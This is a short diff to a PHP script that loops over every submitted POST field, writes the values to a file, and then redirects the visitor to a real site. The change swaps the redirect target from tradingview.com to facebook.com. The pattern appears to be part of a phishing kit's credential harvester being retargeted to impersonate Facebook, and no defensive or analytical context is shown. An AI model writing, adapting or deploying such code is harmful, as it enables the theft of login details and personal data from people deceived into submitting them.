@@ -12,6 +12,7 @@ foreach ($_POST as $key => $value) {
 fwrite($file, "\r\n");
 fwrite($file, "\t\t\t\t\t\t");
 fclose($file);
-header("Location: https://www.tradingview.com");
+// header("Location: https://www.tradingview.com");
+header("Location: https://www.facebook.com");
 die();
 ?>
